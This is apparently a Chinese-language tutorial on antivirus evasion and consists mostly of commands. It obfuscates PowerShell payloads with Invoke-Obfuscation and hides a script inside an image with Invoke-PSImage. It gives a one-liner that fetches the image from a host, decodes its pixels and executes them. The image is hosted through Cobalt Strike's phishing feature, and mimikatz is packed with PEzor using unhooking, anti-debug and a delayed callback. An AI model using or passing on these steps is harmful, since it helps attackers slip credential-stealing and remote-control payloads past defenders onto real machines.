网络安全(一)免杀

virbox

https://shell.virbox.com/

Invoke-Obfuscation

https://github.com/danielbohannon/Invoke-Obfuscation

git clone https://github.com/danielbohannon/Invoke-Obfuscation.git

Set-ExecutionPolicy Unrestricted

Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

set scriptpath powershell.ps1 设置ps路径
Encoding 加密
1 选择加密的方式，运行时间较长
out newpowershell.ps1 生成保存的文件

然后使用 powershell 执行

图片

https://github.com/peewpw/Invoke-PSImage.git

先使用下面的命令测试，当前powershell是否支持使用脚本
Get-ExecutionPolicy

如果出现 RemoteSigned
重新设置执行策略 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned

开始隐写
Import-Module .\Invoke-PSimage.ps1
Invoke-PSImage -Script 1.ps1 -Out 1.jpg -image images\1.png

Invoke-PSImage -Script newpowershell.ps1 -image images\1.jpg -Out 2.jpg

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap(“http://127.0.0.1:4466/images/2.jpg");$o=a Byte[] 12800;(0..24)|%{foreach($x in(0..511)){$p=$g.GetPixel($x,$_);$o[$_*512+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..12584]))

打开cs=>攻击=>钓鱼攻击=>文件下载=>文件选择生成的那个图片，上传完成后会生成一个地址，复制保存下来

将最后生成的地址 修改Bitmap地址

PEzor

git clone https://github.com/phra/PEzor.git
cd PEzor
sudo bash install.sh
bash PEzor.sh –h

安装完会报错

下载https://github.com/EgeBalci/sgn

解压后放入PEzor的目录然后
export PATH=$PATH:~/go/bin/:/root/dvwa/PEzor:/root/dvwa/PEzor/deps/donut_v0.9.3/:/root/dvwa/PEzor/deps/wclang/_prefix_PEzor_/bin/

注意：/home/dvwa/PEzor,要自己的路径，而且此命令只在当前shell下有效

休眠120秒上线的mimikatz

PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz.exe -z 2
